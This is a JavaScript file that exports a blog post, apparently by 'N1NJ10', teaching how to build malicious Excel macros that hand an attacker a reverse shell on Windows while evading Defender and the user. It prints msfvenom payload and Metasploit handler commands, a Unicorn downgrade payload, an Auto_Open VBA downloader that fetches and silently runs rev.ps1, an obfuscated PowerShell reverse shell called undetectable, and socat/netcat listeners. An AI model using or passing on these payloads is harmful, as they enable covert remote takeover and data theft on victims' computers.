const newPost = {
    title: 'Macros With N1NJ10 [ Undetectable Windwos 11&10]',
    body: `
    <h3>Let's start</h3>
    <h3>Frist we need to understand what is Macros ?</h3>
    <p><strong>Macros are used to automate frequently used tasks. Hackers have been using Macros for a long time as a means to gain initial access to target networks by injecting malicious code into macros. These macros are all called malicious macros or macro malware or macro virus. Let’s see how to create a malicious macro to exploit Windows devices, For more info you can click</strong> <a href="https://en.wikipedia.org/wiki/Macro\_and\_security"><strong>here</strong></a></p>
    <ul>
    <li><h3 id="create-vba-payload-x20-">Create VBA Payload&#x20;</h3>
    </li>
    </ul>
    <p><strong>First, we need to generate our malicious with Metasploit</strong>&#x20;</p>
    <pre><code>┌──(root㉿N1NJ10)-[~]
    └─<span class="hljs-meta"># msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<span class="hljs-meta-string">&lt;ATTACKER_IP&gt;</span> LPORT=<span class="hljs-meta-string">&lt;ATTACKER_PORT&gt;</span> -e x86/shikata_ga_nai -i 2 -f vba</span>
    </code></pre>
    <br>It will generate something like this, Save it we will use it later</br>

    <figure><img src="../photos/1.png" alt=""><figcaption><p><strong>VBA_Script</strong></p></figcaption></figure>
    
    <p><strong>Then go to the Windows machine, I prefer to use Windows 10 for this task,</strong></p>
    <ul>
    <li><strong>Then open the Excel Program</strong>&#x20;</li>
    <li><strong>Write blabla in empty columns</strong>&#x20;</li>
    <li><strong>Go to the “view” tab</strong>&#x20;</li>
    <li><strong>Click on macros and select its sub-menu option “view macros“.</strong></li>
    </ul>
    <figure><img src="../photos/2.png" alt=""><figcaption><p><strong>Open_View_Macro</strong></p></figcaption></figure>
    
    <ul>
    <li><strong>Then type your macro file name and click create</strong>&#x20;</li>
    </ul>
    <figure><img src="../photos/3.png" alt=""><figcaption><p><strong>Create_Macro</strong></p></figcaption></figure>
    
    <ul>
    <li><strong>Remember the payload from the first, Go and copy it and paste it into the code Block</strong>&#x20;</li>
    </ul>
    <figure><img src="../photos/4.png" alt=""><figcaption><p><strong>inject</strong></p></figcaption></figure>
    
    <p><strong>Save the file as &quot; </strong><mark style="color:yellow;"><strong>Excel Macro-Enabled Workbook</strong></mark><strong> &quot; type</strong>&#x20;</p>
    <figure><img src="../photos/5.png" alt=""><figcaption><p><strong>Save_Me</strong></p></figcaption></figure>
    
    <p><strong>Last but not least we need to set our handler to establish the connection, From your Attacker machine</strong>&#x20;</p>
    <pre><code>┌──(root㉿N1NJ10)-[~]
    └─# msfconsole -q -x " use exploit/multi/handler; <span class="hljs-built_in">set</span> -g PAYLOAD windows/x64/meterpreter/reverse_https;<span class="hljs-built_in">set</span> -g LHOST &lt;ATTACKER_IP&gt; ;<span class="hljs-built_in">set</span> -g LPORT &lt;ATTACKER_PORT&gt; ; run"
    </code></pre><figure><img src=".gitbook/assets/macro6.png" alt=""><figcaption><p><strong>Msf</strong></p></figcaption></figure>
    
    <p><strong>Now, we are good to start our POC, Go to your Windows machine and open our file Then click on the “</strong><mark style="color:yellow;"><strong>Enable Content</strong></mark><strong>” button</strong></p>
    <figure><img src=".gitbook/assets/macro7.png" alt=""><figcaption><p><strong>Enable_Macro</strong></p></figcaption></figure>
    
    <p>Then go to your Meterpreter, Pingo The Windows Defender blocks the script and block the file also&#x20;</p>
    <p>&#x20;</p>
    <figure><img src=".gitbook/assets/messi_fails.png" alt=""><figcaption><p><strong>Fail</strong></p></figcaption></figure>
    
    <p><strong>Despite of we encoded our payload with the shikata_ga_nai encoder the Defender detected us, So we aren&#39;t script kiddies As Peter Kim said in Playbook2 &quot;</strong><mark style="color:yellow;"><strong>My feelings on Anti-Virus (AV) scanners are that they are there to stop the script kiddies or old malware</strong></mark><strong>&quot;</strong></p>
    <p><strong>So I tried many ways to achieve this, and here are some ways that I can bypass the Defender and the Firewall</strong>&#x20;</p>
    <ul>
    <li><h3 id="unicorn-x20-">Unicorn&#x20;</h3>
    </li>
    </ul>
    <p><strong>Magic Unicorn is a simple tool for using a PowerShell downgrade attack and injecting shellcode straight into memory. Based on Matthew Graeber&#39;s PowerShell attacks and the PowerShell bypass technique</strong></p>
    <p><strong>First, You need to download the repo from</strong> <a href="https://github.com/trustedsec/unicorn"><strong>github</strong> </a></p>
    <pre><code>git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/trustedsec/unicorn.git
    </code></pre><p>Then you are ready to generate your payload&#x20;</p>
    <pre><code>┌──(root㉿N1NJ10)-[~/Downloads/tools/unicorn]
    └─# <span class="hljs-keyword">python3</span> unicorn.<span class="hljs-keyword">py</span> windows/meterpreter/reverse_https <span class="hljs-symbol">&lt;ATTACKER_IP&gt;</span> <span class="hljs-symbol">&lt;ATTACKER_PORT&gt;</span>  macro
    </code></pre><p>{% hint style=&quot;info&quot; %}
    NOTE: x64 meterpreter payload selected which is not compatible. Unicorn handles shellcode creation on both 32 and 64 by using an x86 downgrade attack regardless of 32 and 64 bit platforms. No interaction needed, downgrading to 32-bit payload.
    {% endhint %}</p>
    <figure><img src=".gitbook/assets/macro8.png" alt=""><figcaption><p><strong>Unicorn</strong></p></figcaption></figure>
    
    <p>Go to your Windows machine and repeat the steps we did before opening Excel ..... , execpt copy our payload from the Powershell_attack.txt file that unicorn generate it&#x20;</p>
    <figure><img src=".gitbook/assets/macro11.png" alt=""><figcaption><p><strong>Copy_Payload</strong></p></figcaption></figure>
    
    <p><strong>Then save the file</strong>&#x20;</p>
    <figure><img src=".gitbook/assets/macro9.png" alt=""><figcaption><p><strong>Save_Me</strong></p></figcaption></figure>
    
    <p>We need to set our listener now , from the attacker machine&#x20;</p>
    <pre><code>msfconsole -q -x " <span class="hljs-keyword">use</span> exploit/multi/<span class="hljs-keyword">handler</span>; <span class="hljs-keyword">set</span> -g PAYLOAD windows/meterpreter/reverse_https;<span class="hljs-keyword">set</span> -g LHOST &lt;ATTACKER_IP&gt; ;<span class="hljs-keyword">set</span> -g LPORT &lt;ATTACKER_PORT&gt; ;<span class="hljs-keyword">set</span> AutoRunScript <span class="hljs-string">'migrate -n explorer.exe'</span>;<span class="hljs-keyword">set</span> EXITONSESSION <span class="hljs-literal">false</span>; <span class="hljs-keyword">set</span> EXITFUNC <span class="hljs-keyword">thread</span>; run"
    </code></pre><figure><img src=".gitbook/assets/micro12.png" alt=""><figcaption><p>Listner</p></figcaption></figure>
    
    <p>Now we are good to establish the attack, Go to your windows and launch the Excel file&#x20;</p>
    <figure><img src=".gitbook/assets/micro13.png" alt=""><figcaption><p><strong>Click_Here</strong></p></figcaption></figure>
    
    <p><strong>Click on &quot; Enable Content &quot;, and you should see this error message</strong>&#x20;</p>
    <figure><img src=".gitbook/assets/micro14.png" alt=""><figcaption><p><strong>Fake_error</strong></p></figcaption></figure>
    
    <p><strong>Then go to your Attacker machine, you should see that</strong>&#x20;</p>
    <figure><img src=".gitbook/assets/micro15.png" alt=""><figcaption><p><strong>Pingo</strong></p></figcaption></figure>
    
    <p><strong>But this method may the user to call his supervisor and tell him about this problem or he may guess this is a suspicious file so </strong><mark style="color:yellow;"><strong>we fail again.</strong></mark></p>
    <ul>
    <li><h3 id="cve-2017-8759">CVE-2017-8759</h3>
    </li>
    </ul>
    <p><strong>A remote code execution vulnerability exists when Microsoft .NET Framework processes untrusted input. An attacker who successfully exploited this vulnerability in software using the .NET framework could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights. To exploit the vulnerability, an attacker would first need to convince the user to open a malicious document or application. The security update addresses the vulnerability by correcting how .NET validates untrusted input.</strong>&#x20;</p>
    <p>{% embed url=&quot;<a href="https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-8759/">https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-8759/</a>&quot; %}</p>
    <p><strong>So we can upload a file with a script without being detected this is suspicious keep it or not  so now we need 3 main things to make this happen :</strong>&#x20;</p>
    <ul>
    <li><mark style="color:yellow;"><strong>VBA script</strong></mark><strong>  to download our file in a stealthy way</strong>&#x20;</li>
    <li><mark style="color:yellow;"><strong>Undetectable reverse shell</strong></mark></li>
    <li><mark style="color:yellow;"><strong>Listener</strong></mark><strong> to establish the connection</strong>&#x20;</li>
    </ul>
    <p><strong>Let&#39;s start with the VBA script</strong>&#x20;</p>
    <pre><code><span class="hljs-keyword">Sub</span> Auto_Open()             
    
    <span class="hljs-keyword">If</span> <span class="hljs-built_in">Len</span>(Dir(<span class="hljs-string">"c:\temp"</span>, vbDirectory)) = <span class="hljs-number">0</span> <span class="hljs-keyword">Then</span>
    MkDir <span class="hljs-string">"c:\temp"</span>
    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span>
    
    <span class="hljs-keyword">Dim</span> xHttp: <span class="hljs-keyword">Set</span> xHttp = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">"Microsoft.XMLHTTP"</span>)
    <span class="hljs-keyword">Dim</span> bStrm: <span class="hljs-keyword">Set</span> bStrm = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">"Adodb.Stream"</span>)
    xHttp.Open <span class="hljs-string">"GET"</span>, <span class="hljs-string">"http://10.0.2.8:800/rev.ps1"</span>, <span class="hljs-literal">False</span>
    xHttp.Send
    
    <span class="hljs-keyword">With</span> bStrm
    .Open
    .Type = <span class="hljs-number">1</span> <span class="hljs-comment">'//binary</span>
    .write xHttp.responseBody
    .savetofile <span class="hljs-string">"c:\temp\rev.ps1"</span>, <span class="hljs-number">2</span> <span class="hljs-comment">'//overwrite</span>
    <span class="hljs-keyword">End</span> <span class="hljs-keyword">With</span>
    
    Shell (<span class="hljs-string">"powershell -ep bypass -WindowStyle Hidden c:\temp\rev.ps1"</span>)
    
    <span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span>
    </code></pre><p>{% hint style=&quot;info&quot; %}
    This script <a href="https://github.com/S3cur3Th1sSh1t/OffensiveVBA/blob/main/src/Download\_Autostart.vba">here </a>helped me build mine&#x20;
    {% endhint %}</p>
    <p><strong>So what does this script really do :</strong>&#x20;</p>
    <ul>
    <li><strong>It first checks whether the c:\temp exists or not if yes it keeps it if not it will creates one</strong>&#x20;</li>
    </ul>
    <p>{% hint style=&quot;info&quot; %}
    You can delete this line if you don&#39;t want to make a dir in the destination machine&#x20;
    {% endhint %}</p>
    <ul>
    <li><strong>Then we establish a connection to make the victim download our malicious payload, The ADO technology is used for saving the contents of the file to disk. Both technologies are launched by the</strong> <a href="https://www.promotic.eu/en/pmdoc/ScriptLangs/VBScript/PropMeth/CreateObject.htm"><strong>CreateObject</strong></a> <strong>method</strong></li>
    </ul>
    <p>{% hint style=&quot;info&quot; %}
    This script <a href="https://gist.github.com/caglarorhan/44f7ebcc857f0c1be1aff2cc13349c23">here </a>helped me with this step, for more info click <a href="https://www.promotic.eu/en/pmdoc/Directions/HowSaveBinFileInWeb.htm">here</a>
    {% endhint %}</p>
    <ul>
    <li><p><strong>Then save our file in the temp directory, and execute it with -ep bypass to</strong>&#x20;</p>
    <p><strong>Bypassing the PowerShell Execution Policy and the -WindowStyle Hidden to hide the window from the user</strong>&#x20;</p>
    </li>
    </ul>
    <p><strong>That&#39;s it for the VBA script it now good to download our malicious payload</strong>&#x20;</p>
    <p><strong>Next, we need to get Undetectable Reverse PowerShell in this step you can use tools or Frameworks to generate your payload such as</strong> <a href="https://github.com/EmpireProject/Empire"><strong>Empire</strong></a><strong>,</strong> <a href="https://github.com/Veil-Framework/Veil"><strong>Veil</strong></a><strong>,</strong> <a href="https://www.metasploit.com/download"><strong>Metasploit</strong></a><strong>, ....</strong></p>
    <p><strong>But fortunately, I found a good Undetectable Reverse PowerShell from</strong> <a href="https://gist.github.com/guglia001/1de961b6b7fef4ef4f383015bb0f7c1e"><strong>here</strong> </a></p>
    <pre><code>$KLK = <span class="hljs-keyword">New</span>-Object System.Net.Sockets.TCPClient(<span class="hljs-string">'&lt;ATTACKER_IP&gt;'</span>,<span class="hljs-string">'&lt;ATTKER_PORT&gt;'</span>);
    $PLP = $KLK.GetStream();
    [byte[]]$VVCCA = <span class="hljs-number">0.</span>.((<span class="hljs-number">2</span>-shl(<span class="hljs-number">3</span>*<span class="hljs-number">5</span>))<span class="hljs-number">-1</span>)|%{<span class="hljs-number">0</span>};
    $VVCCA = ([text.encoding]::UTF8).GetBytes(<span class="hljs-string">"Succesfuly connected .\`n\`n"</span>)
    $PLP.Write($VVCCA,<span class="hljs-number">0</span>,$VVCCA.Length)
    $VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + <span class="hljs-string">' &gt; '</span>)
    $PLP.Write($VVCCA,<span class="hljs-number">0</span>,$VVCCA.Length)
    [byte[]]$VVCCA = <span class="hljs-number">0.</span>.((<span class="hljs-number">2</span>-shl(<span class="hljs-number">3</span>*<span class="hljs-number">5</span>))<span class="hljs-number">-1</span>)|%{<span class="hljs-number">0</span>};
    <span class="hljs-keyword">while</span>(($A = $PLP.Read($VVCCA, <span class="hljs-number">0</span>, $VVCCA.Length)) -ne <span class="hljs-number">0</span>){;$DD = (<span class="hljs-keyword">New</span>-Object System.Text.UTF8Encoding).GetString($VVCCA,<span class="hljs-number">0</span>, $A);
    $VZZS = (i\`eX $DD <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-String );
    $HHHHHH  = $VZZS + (pwd).Path + <span class="hljs-string">'! '</span>;
    $L = ([text.encoding]::UTF8).GetBytes($HHHHHH);
    $PLP.Write($L,<span class="hljs-number">0</span>,$L.Length);
    $PLP.Flush()};
    $KLK.Close()
    </code></pre><p><strong>This a good one and Undetectable at the time of this Writeup</strong>&#x20;</p>
    <p><strong>For the listener you can use</strong> <a href="https://www.varonis.com/blog/netcat-commands"><strong>Netcat</strong> </a><strong>but I prefer using</strong> <a href="https://www.redhat.com/sysadmin/getting-started-socat"><strong>Socat</strong> </a><strong>cuz it is more stealthy</strong></p>
    <p><strong>Now Let the Game start</strong>&#x20;</p>
    <p><strong>First go to your windows machine :</strong></p>
    <ul>
    <li><strong>Then open the Excel Program</strong>&#x20;</li>
    <li><strong>Write blabla in empty columns</strong>&#x20;</li>
    <li><strong>Go to the “view” tab</strong>&#x20;</li>
    <li><strong>Click on macros and select its sub-menu option “view macros“.</strong></li>
    </ul>
    <figure><img src=".gitbook/assets/macro111.png" alt=""><figcaption><p>Create_Me</p></figcaption></figure>
    
    <ul>
    <li><strong>Then type your macro file name and click create</strong>&#x20;</li>
    <li><strong>Copy our VBA script after add your IP and port  Then paste it into the code Block</strong>&#x20;</li>
    </ul>
    <figure><img src=".gitbook/assets/macro222.png" alt=""><figcaption><p>Bad_Macro</p></figcaption></figure>
    
    <ul>
    <li><strong>Save the file as &quot; </strong><mark style="color:yellow;"><strong>Excel Macro-Enabled Workbook</strong></mark><strong> &quot; type</strong>&#x20;</li>
    </ul>
    <figure><img src=".gitbook/assets/macro333.png" alt=""><figcaption><p>Save_Me</p></figcaption></figure>
    
    <ul>
    <li><strong>Now go to the Attacker machine and save our payload file in a file called &quot;rev.ps1&quot;</strong>&#x20;</li>
    </ul>
    <p>{% hint style=&quot;info&quot; %}
    If you wanna to edit the file name you should edit it in the VBAS script aslo
    {% endhint %}</p>
    <ul>
    <li><strong>Then make a python http server with the port you choose and write in the VBA script</strong>&#x20;</li>
    </ul>
    <pre><code>┌──(root㉿N1NJ10)-[~]
    └─# python3 -m http.server &lt;ATTACKER_HTTP_PORT&gt;
    Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">800</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">800</span>/) ...
    </code></pre><figure><img src=".gitbook/assets/a.png" alt=""><figcaption><p><strong>http.server</strong></p></figcaption></figure>
    
    <ul>
    <li><strong>Then we need to start our Socat</strong>&#x20;</li>
    </ul>
    <pre><code>┌──(<span class="hljs-selector-tag">root</span>㉿<span class="hljs-selector-tag">N1NJ10</span>)<span class="hljs-selector-tag">-</span><span class="hljs-selector-attr">[~/Downloads/tools/random_scripts]</span>
    └─# <span class="hljs-selector-tag">socat</span> <span class="hljs-selector-tag">TCP4-LISTEN</span><span class="hljs-selector-pseudo">:1234</span>,<span class="hljs-selector-tag">fork</span> <span class="hljs-selector-tag">STDOUT</span>
    </code></pre><figure><img src=".gitbook/assets/b.png" alt=""><figcaption><p>Socaketty</p></figcaption></figure>
    
    <p>{% hint style=&quot;info&quot; %}
    You can use &quot; rlwrap nc -nlvp 1234 &quot; for netcat&#x20;
    {% endhint %}</p>
    <p><strong>Before we start, look at my C: dir</strong>&#x20;</p>
    <figure><img src=".gitbook/assets/d.png" alt=""><figcaption><p><strong>Temp ??</strong></p></figcaption></figure>
    
    <p><strong>There is no dir called Temp here, It is just for POC</strong>&#x20;</p>
    <h3 id="here-we-goo-">Here We goo 🥷</h3>
    <p><strong>Go to your Windows machine and open our file Then click on the “</strong><mark style="color:yellow;"><strong>Enable Content</strong></mark><strong>” button</strong></p>
    <figure><img src=".gitbook/assets/e.png" alt=""><figcaption><p><strong>Click_On_Me</strong></p></figcaption></figure>
    
    <p><strong>once you click you will notice no nothing malicious happened, but that&#39;s the point of being stealthy cuz we are the guys who know what should happen We will see in particular places</strong>&#x20;</p>
    <ul>
    <li><strong>First, you will notice that there is a temp dir just created and it contains a file called rev.ps1 that&#39;s our reverse shell, the user will notice nothing the Excel will not exit or something not normal will happen like before</strong>&#x20;</li>
    </ul>
    <figure><img src=".gitbook/assets/f.png" alt=""><figcaption><p><strong>Temp_Now !</strong></p></figcaption></figure>
    
    <ul>
    <li><strong>Now go to your Attacker machine you will notice that the Python HTTP server send a file called rev.ps1 which is our payload</strong>&#x20;</li>
    </ul>
    <figure><img src=".gitbook/assets/g.png" alt=""><figcaption><p><strong>Python_HTTP</strong></p></figcaption></figure>
    
    <ul>
    <li><strong>Go to the tab you open the Socat listener to check</strong>&#x20;</li>
    </ul>
    <figure><img src=".gitbook/assets/h.png" alt=""><figcaption><p><strong>N1NJ10</strong></p></figcaption></figure>
    
    <ul>
    <li>Pingo, We got the shell with no warnings&#x20;</li>
    </ul>
    <figure><img src=".gitbook/assets/mr-robot.jpg" alt=""><figcaption><p><strong>We Make it</strong> </p></figcaption></figure>
    
    <p><strong>That&#39;s it, my friend, I&#39;m happy to share with you more of my articles and tips\&amp;tricks If you want just Subscribe to our Telegram channel :</strong>&#x20;</p>
    <p>{% embed url=&quot;<a href="https://t.me/N1NJ10">https://t.me/N1NJ10</a>&quot; %}
    <strong>N1NJ10</strong>
    {% endembed %}</p>
    <p><strong>You can also send me a message on my any social media accounts here :</strong> &#x20;</p>
    <p><strong>LinkedIn:-</strong> <a href="https://www.linkedin.com/in/fadymoheb"><strong>https://www.linkedin.com/in/fadymoheb</strong></a></p>
    <p><strong>Facebook:-</strong> <a href="https://www.facebook.com/FADYMo7eB"><strong>https://www.facebook.com/FADYMo7eB</strong></a></p>
    <p><strong>Twitter:-</strong> <a href="https://twitter.com/FadyMo7eb?s=09"><strong>https://twitter.com/FadyMo7eb?s=09</strong></a></p>
    <p><strong>Tryhackme:-</strong> <a href="https://tryhackme.com/p/FadyMoheb"><strong>https://tryhackme.com/p/FadyMoheb</strong></a></p>
    <p><strong>See you in another great writeup 😉</strong><a href="https://medium.com/tag/reverse-engineering?source=post\_page-----59e1120bde30---------------reverse\_engineering-----------------">\
    </a>\
    \</p>
    `,
    description: 'Hey there in this article I will show you  some ways that you can exploit Windows devices using Macros in a stealthy way that undetectable on windowsdefender , Firewall,l and the user',
    date: new Date(1901, 6, 2),
    previewPicture: '../photos/Macro.png',
    tags: ['ECPTX'],
    author: 'N1NJ10',
    category: 'Linux'
};

export default newPost;